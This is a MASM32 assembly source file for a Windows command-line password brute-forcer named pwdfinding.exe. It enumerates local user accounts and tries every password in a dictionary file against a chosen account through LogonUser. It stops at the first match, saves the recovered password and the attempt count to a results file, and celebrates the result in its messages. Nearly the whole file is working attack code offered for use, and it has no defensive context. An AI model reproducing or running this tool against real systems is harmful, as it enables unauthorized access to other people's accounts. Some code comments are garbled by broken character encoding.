.686
include	\masm32\include\masm32rt.inc
include	\masm32\include\Advapi32.inc
include	\masm32\include\netapi32.inc

include	.\Stdlib\Stdlib.inc	
include	.\Stdlib\Stdlib.mac
include	\masm32\macros\macros.asm

include	totaltime.inc

includelib \masm32\lib\msvcrt.lib
includelib .\Stdlib\Stdlib.lib
includelib \masm32\lib\Advapi32.lib
includelib \masm32\lib\netapi32.lib

DisplayHelp	PROTO
FindFlag		PROTO :DWORD, :DWORD
GetFlagValue	PROTO :DWORD, :DWORD, :DWORD
ShowUsersList	PROTO
memset		PROTO c:DWORD, :DWORD, :DWORD 

.const
DEBUG 			equ 0
LOGON32_LOGON_NETWORK	equ 3
LOGON32_PROVIDER_DEFAULT	equ 0


.data?
align 4
hModuleHandle		DWORD ?
szFileName		BYTE MAX_PATH dup(?)

.data
align 4
szResultFile		BYTE 'result_.txt',0
szDomain			BYTE '.',0
szlf			BYTE 13,10,0

szResultFileFormat		BYTE 'The administrator',27h,'s password is: %s',0dh,0ah
			BYTE 'The program had tried %d times! :)',0dh,0ah,0

szNoDicFileErr		BYTE 'Sorry,dic file not exists.',0
szCreateFileMappingErr	BYTE 'CreateFileMapping Error!',0
szMapViewOfFileErr		BYTE 'MapViewOfFile Error!',0

szNotFound		BYTE 'Password not found! :(',0dh,0ah,0

szUsage			BYTE 'Usage: pwdfinding.exe /help',13,10,0
szHelpl			BYTE 'help',0
szHelp2			BYTE 'h',0
szHelp3			BYTE '?',0
ddFlag			DWORD 0

szUserStr			BYTE '/user:',0
szPathtoFile		BYTE '/file:',0

lpszUsername		BYTE [MAX_PATH] dup(0) 
lpszPathtoFile		BYTE [MAX_PATH] dup(0) 
szBuff			BYTE [MAX_PATH] dup(0)

;******************************************************************************** 
.code
align 4

_WinMain        proc
local	@hPswDic:DWORD,\
	@szPswTmp[MAX_PATH]:BYTE,\
	@dwPswDicFileSize:DWORD,\
	@hResultFile:DWORD,\
	@dwWritten:DWORD,\
	@hPswDicFileMap:DWORD,\
	@hToken:DWORD,\
	@dwTriedTimes:DWORD,\
	@szBuf[MAX_PATH]:BYTE,\
	@dwContentLength:DWORD,\
	@lpPswDic:DWORD,\
	@lpNext:DWORD,\
	@lpStart:DWORD,\
	@dwStart:DWORD
      
;Create file to record results.

	invoke	CreateFile,offset szResultFile,GENERIC_READ or GENERIC_WRITE,\
			FILE_SHARE_READ or FILE_SHARE_WRITE,NULL,OPEN_ALWAYS,\
			FILE_ATTRIBUTE_NORMAL,NULL
	.if	eax == INVALID_HANDLE_VALUE
		jmp _Error_Exit
	.endif
	mov	@hResultFile,eax
;Open Dictionary file.
	invoke	CreateFile,offset lpszPathtoFile,GENERIC_READ,\
			FILE_SHARE_READ,NULL,OPEN_EXISTING,\
			FILE_ATTRIBUTE_NORMAL,NULL
	.if	eax == INVALID_HANDLE_VALUE
		invoke	WriteFile,@hResultFile,offset szNoDicFileErr,\
			sizeof szNoDicFileErr,\
			addr @dwWritten,NULL
		jmp	_Error_Exit
	.endif
	mov	@hPswDic,eax

	invoke	GetFileSize,@hPswDic,NULL
	mov	@dwPswDicFileSize,eax
;**********CreateFileMapping**********
	invoke	CreateFileMapping,@hPswDic,NULL,PAGE_READONLY,0,0,NULL
	.if	eax==NULL
		invoke	WriteFile,@hResultFile,offset szCreateFileMappingErr,\
			sizeof szCreateFileMappingErr,\
			addr @dwWritten,NULL
		jmp	_Error_Exit      
	.endif
	mov	@hPswDicFileMap,eax
;**********MapViewOfFile**********
	invoke	MapViewOfFile,eax,FILE_MAP_READ,0,0,0
	.if	eax==NULL
		invoke	WriteFile,@hResultFile,offset szMapViewOfFileErr,\
			sizeof szMapViewOfFileErr,\
			addr @dwWritten,NULL
		jmp	_Error_Exit
	.endif

	mov	@lpPswDic,eax
	mov	@lpNext,eax
	mov	@lpStart,eax
      
	invoke	GetTickCount
	mov	@dwStart,eax

	xor	ecx,ecx
	xor	eax,eax
	mov	@dwTriedTimes,eax

	.while	TRUE
		cld
		mov	esi,@lpStart

		lea	edi,@szPswTmp
	@@:	lodsb
		.if	al!=0dh
		stosb
		inc	ecx
		.if	ecx==@dwPswDicFileSize
			jmp	@F
		.elseif	ecx>@dwPswDicFileSize
			jmp        _NotFound
		.endif
			jmp	@B
		.endif
	@@:	add	ecx,2
		xor	eax,eax
		stosw
      
		lea        eax,[esi+1]
		mov        @lpNext,eax
		
		pushad	
		invoke	StdOut, addr @szPswTmp
		invoke	StdOut, addr szlf		
		popad

		push	ecx
		invoke	LogonUser,offset lpszUsername,offset szDomain,\
				addr @szPswTmp,\
				LOGON32_LOGON_NETWORK,\
				LOGON32_PROVIDER_DEFAULT,\
				addr @hToken

		.if        eax==NULL
			pop        ecx

			push	@lpNext
			pop	@lpStart
                      
			inc	@dwTriedTimes
			.continue
		.else
			pop	ecx
			.break
		.endif
	.endw

	invoke	GetTickCount

	sub	eax,@dwStart
	mov	@dwStart,eax

	invoke	wsprintf,addr @szBuf,offset szResultFileFormat,\
			addr @szPswTmp,\
			@dwTriedTimes
	invoke	lstrlen,addr @szBuf
	mov	@dwContentLength,eax

	invoke	WriteFile,@hResultFile,addr @szBuf,\
			@dwContentLength,\
			addr @dwWritten,NULL
      
	invoke	totaltime,addr @szBuf,@dwStart,@dwTriedTimes,NULL
	invoke	lstrlen,addr @szBuf
	mov	@dwContentLength,eax

	invoke	WriteFile,@hResultFile,addr @szBuf,\
			@dwContentLength,\
			addr @dwWritten,NULL
      

	xor	eax,eax
	inc	eax
	ret

_NotFound:
	invoke	GetTickCount
	sub	eax,@dwStart
	mov	@dwStart,eax

	invoke	lstrcpy,addr @szBuf,offset szNotFound
	invoke	totaltime,addr @szPswTmp,@dwStart,@dwTriedTimes,NULL

	invoke	lstrcat,addr @szBuf,addr @szPswTmp

	invoke	lstrlen,addr @szBuf
	mov	@dwContentLength,eax

	invoke	WriteFile,@hResultFile,addr @szBuf,\
			@dwContentLength,\
			addr @dwWritten,NULL

_Error_Exit:
	xor        eax,eax
	ret
_WinMain        endp


;******************************************************************************** 
; void DisplayHelp()
; Input	- NULL
; Output	- Show help string
.data

	szHelp	db 'Usage: pwdfinding.exe /user: [some_local_user_name or *]/file: [path to file] ',13,10,0

.code
DisplayHelp proc
	invoke	StdOut, addr szHelp	
	ret
DisplayHelp endp
;******************************************************************************** 
;bool FindFlag(lpszFlag, lpszCommandLine)
; Input	- lpszFlag - sample for finding
;	- lpszCommandLine - pointer of command line
; Output	- bool TRUE or FALSE
FindFlag proc uses edi	lpszFlag:DWORD, lpszCommandLine:DWORD
	mov	edi,lpszCommandLine
	mov	esi,lpszFlag
	invoke	lstrlen, lpszCommandLine
	mov	ecx,eax
___find:	cmp	byte ptr [edi], '/'
	jne	___next1
	pushad	
	inc	edi
	invoke	lstrcmp, edi,lpszFlag
	.if	eax == 0
		xor	eax,eax
		mov	eax,1
		ret
	.endif
	popad
___next1:	cmp	byte ptr [edi], '-'
	jne	___next2
	pushad	
	inc	edi
	invoke	lstrcmp, edi,lpszFlag
	.if	eax == 0
		xor	eax,eax
		mov	eax,1
		ret
	.endif
	popad
___next2:	inc	edi
	loop	___find
	xor	eax,eax
	ret
FindFlag endp
;******************************************************************************** 
;handle GetFlagValue(lpszFlag, lpszCommandLine, outbuff)
; Input	- lpszFlag - sample for finding
;	- lpszCommandLine - pointer of command line
; Output	- outbuff - handle of substring
.data
	szBlankChar	db 20h
.code
GetFlagValue proc 	lpszFlag:DWORD, lpszCommandLine:DWORD, outbuff:DWORD
local	temp[MAX_PATH]:BYTE

	invoke	memset, addr temp, 0, MAX_PATH
	invoke	lstrcpy, addr temp, lpszCommandLine
	invoke	lstrcat, addr temp, addr szBlankChar
	lea	edi,temp
	mov	esi,lpszFlag

	; ��� � Stdlib - ������. ������ StrPos � ���� �������, � ����� StrPos.asm,
	; ����� ��� ������� StrStr. ������ ��������.
	; ��� ��� ���������� StrStr �� ������ StrPos � ���
	invoke	StrStr, addr temp, lpszFlag 
	.if	eax!=-1
		add	edi,eax
		invoke	lstrlen, lpszFlag
		add	edi,eax
		push	edi	
		invoke	lstrlen, edi
		mov	ecx,eax
__setZero:	cmp	byte ptr [edi],20h	; 20h - ������ 
		je	__pachStr
		inc	edi
		loop	__setZero
__pachStr:	mov	byte ptr [edi],0 ;
		pop	edi
		.if	outbuff != 0	
			invoke	lstrcpy, outbuff, edi
		.endif
		xor	eax,eax
		inc	eax		
		ret
	.else
		xor	eax,eax
		ret	
	.endif

GetFlagValue endp
;********************************************************************************
;void ShowUsersList()
; Input	- NULL
; Output	- list of local users 
.data
ui		USER_INFO_1 <>
lf		db 13,10,0

.data?
entries_read	dd ?
entries_total	dd ?
resume_hndl	dd ?

.code
ShowUsersList proc 
local tmpstr[256]:BYTE
local cyrBuffer[256]:BYTE

	invoke	NetUserEnum, 0, 1,FILTER_NORMAL_ACCOUNT,\
			offset ui,\
			MAX_PREFERRED_LENGTH,\
			offset entries_read,\
			offset entries_total,\
			offset resume_hndl
	xor	ecx,ecx
	mov	esi,dword ptr ui

@@:	mov	edi,[esi]

	push	ecx
	push	esi
	invoke	WideCharToMultiByte, CP_ACP, 0, \
		edi,  -1, addr tmpstr, \
		256,  NULL, NULL
 
	invoke	CharToOem, addr tmpstr,addr cyrBuffer 
	invoke	StdOut, addr cyrBuffer
	invoke	StdOut, addr lf	
	pop	esi
	pop	ecx

	inc	ecx
	add	esi,sizeof USER_INFO_1
	cmp	ecx,entries_read
	jb	@b

	invoke	NetApiBufferFree,offset ui
	ret	
ShowUsersList endp
;******************************************************************************** 

start:
	invoke	ParamCount	; � eax - ���������� ���������� ���. ������
	.if	eax == 0
		invoke	StdOut, addr szUsage
		jmp	__quit
	.endif

	call	GetCommandLine	; � eax ��������� ������ ���� � ��������� ������
	invoke	lstrcpy, addr szBuff, eax

	; ������ ������ ���. ������
	invoke	FindFlag, addr szHelpl, addr szBuff	; 'help'	- DisplayHelp()
	or	ddFlag,eax
	invoke	FindFlag, addr szHelp2, addr szBuff	; 'h'	- DisplayHelp()
	or	ddFlag,eax
	invoke	FindFlag, addr szHelp3, addr szBuff	; '?'	- DisplayHelp()
	or	ddFlag,eax

	.if	ddFlag != 0
		invoke	StdOut, addr szHelp
		ret	
	.endif

	mov	ddFlag,1
	invoke	GetFlagValue, addr szUserStr, addr szBuff, addr lpszUsername
	and	ddFlag,eax
	invoke	GetFlagValue, addr szPathtoFile, addr szBuff, addr lpszPathtoFile
	and	ddFlag,eax



	lea	edi,lpszUsername
	cmp	byte ptr [edi],'*'
	jne	__noUsersList
	invoke	ShowUsersList
	ret


	.if	ddFlag == 0
		invoke	StdOut, addr szHelp
		ret	
	.endif
__noUsersList:

	invoke	GetModuleHandle,NULL
	mov	hModuleHandle,eax
	invoke	GetModuleFileName,hModuleHandle,offset szFileName,\
			sizeof szFileName
	invoke	lstrlen,offset szFileName
	cld
	mov	esi,offset szFileName
	add	esi,eax
	std
@@:	lodsb
	cmp	al,5ch
	jne	@B
	mov	byte ptr [esi+2],0
	cld
	invoke	SetCurrentDirectory,offset szFileName
	call	_WinMain
__quit:	invoke	ExitProcess,NULL
;******************************************************************************** 
        end        start